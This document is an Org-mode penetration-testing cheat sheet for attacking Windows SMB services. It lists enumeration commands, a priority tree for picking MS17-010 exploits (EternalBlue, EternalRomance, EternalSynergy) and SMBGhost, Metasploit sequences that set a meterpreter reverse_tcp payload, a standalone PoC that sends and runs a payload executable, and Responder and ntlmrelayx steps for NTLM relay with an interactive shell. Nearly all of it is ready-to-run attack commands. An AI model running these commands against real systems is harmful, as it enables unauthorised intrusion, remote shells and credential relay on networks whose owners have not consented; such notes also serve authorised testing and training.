| Finding              | Risk     | Primary Attack             |
|----------------------+----------+----------------------------|
| SMB 1.0              | Critical | EternalBlue, Null Sessions |
| Signing not required | Critical | NTLM Relay                 |
| SMB 3.1.1 present    | Medium   | SMBGhost (CVE-2020-0796)   |

* Enumeration
** Enumerate Host
#+begin_src bash
nxc smb $IP
enum4linux -a $IP
#+end_src

** Check EternalBlue
#+begin_src bash
nmap --script smb-vuln-ms17-010 -p 445 $IP
#+end_src

** Enumerate Shares (with credenials)
#+begin_src bash
# List shares with credentials  
smbclient -L //target.com -U username%password  

# Connect to specific share  
smbclient //target.com/sharename -U username%password

# With credentials  
smbmap -H target.com -u username -p password  

# Recursive enumeration  
smbmap -H target.com -u username -p password -r
#+end_src

** Enumerate Shares (without credentials)
#+begin_src bash
nmap --script=smb-enum-shares -p139,445 $IP
smbmap -H $IP
smbclient -L //$IP -N
nxc smb $IP -u 'guest' -p '' --shares
crackmapexec smb $IP --shares
#+end_src
** Enumerate Files (Connect to share)
#+begin_src bash
smbclient //$IP/<share> -N
# Get share permissions
netexec smb $IP -u 'guest' -p '' -M spider_plus
#+end_src

** Enumerate Hostname / NetBIOS-Name
#+begin_src bash
nmblookup -A $IP
nxc smb $IP
#+end_src

* Exploitation

| Exploit         | Mechanism                             | Go-to Tool             |
|-----------------+---------------------------------------+------------------------|
| EternalBlue     | Buffer overflow in SMBv1 transactions | ~ms17_010_eternalblue~ |
| EternalRomance  | Named pipe write primitive            | ~ms17_010_psexec~      |
| EternalSynergy  | Similar to Romance, newer targets     | ~ms17_010_psexec~      |
| EternalChampion | Transaction2 race condition           | AutoBlue PoC           |

** CVEs
*** Priority Order
#+BEGIN_EXAMPLE
1.  nmap smb-vuln-ms17-010  →  if VULNERABLE, pick by OS:
    ├─ Win XP / 2003         →  EternalChampion (eternalblue_exploit2.py)
    ├─ Win 7 / 2008 R2       →  EternalBlue (ms17_010_eternalblue) or EternalRomance
    ├─ Win 8 / 2012+         →  EternalSynergy (ms17_010_psexec)
    └─ Unknown / fallback    →  AutoBlue (auto-selects best variant)
2.  EternalBlue fails?       →  try ms17_010_psexec (Romance/Synergy)
3.  All Eternals fail        →  NTLM Relay (Responder + ntlmrelayx)
4.  nmap smb-vuln-cve-2020-0796 → if VULNERABLE → SMBGhost
5.  Always try               →  Null session enum (no creds needed)
#+END_EXAMPLE

*** MS17-010 (EternalRomance) (SMB 1.0, x86/x64)
#+BEGIN_SRC text
Requires: SMB 1.0 + unpatched Windows (XP/Vista/7/Server 2003-2008 R2)
Targets:  Named pipe (browser, spoolss, netlogon) — more reliable than EternalBlue
Advantage: Works on x86 AND x64; better success rate on Server 2003/2008
#+END_SRC
#+BEGIN_SRC bash
# Metasploit
use exploit/windows/smb/ms17_010_psexec   # uses EternalRomance/Synergy internally
set RHOSTS 192.168.150.10
set PAYLOAD windows/meterpreter/reverse_tcp   # x86 payload (module handles both arch)
set LHOST <your-ip>
run
 
# Alternative: standalone PoC (Python)
git clone https://github.com/helviojunior/MS17-010
python send_and_execute.py 192.168.150.10 payload.exe
#+END_SRC

*** MS17-010 (EternalSynergy) (SMB 1.0, Win 8+)
#+BEGIN_SRC text
Requires: SMB 1.0 + Windows 8 / Server 2012 and later (newer targets)
Advantage: Specifically designed for targets where EternalBlue fails
Note:      ms17_010_psexec in Metasploit auto-selects Synergy for newer OS
#+END_SRC
#+BEGIN_SRC bash
# Metasploit — same module, auto-selects the right exploit variant
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 192.168.150.10
set LHOST <your-ip>
# Force Synergy if needed
set EternalSynergy true
run
 
# Verify OS version first to confirm applicability
nmap -O -p 445 192.168.150.10
#+END_SRC

Targets:  Windows XP → Server 2008 R2 (x86/x64)
Note:     Less commonly implemented in public frameworks; use PoC repo

** NTLM Relay (Signing not required)
#+BEGIN_SRC text
Requires: Signing disabled + active auth on the network
#+END_SRC
#+BEGIN_SRC bash
# Terminal 1 — disable SMB/HTTP in Responder first
nano /etc/responder/Responder.conf  # set SMB = Off, HTTP = Off
responder -I eth0 -dPv
 
# Terminal 2 — relay to target
ntlmrelayx.py -t smb://192.168.150.10 -smb2support
# Optional: get shell
ntlmrelayx.py -t smb://192.168.150.10 -smb2support -i
#+END_SRC
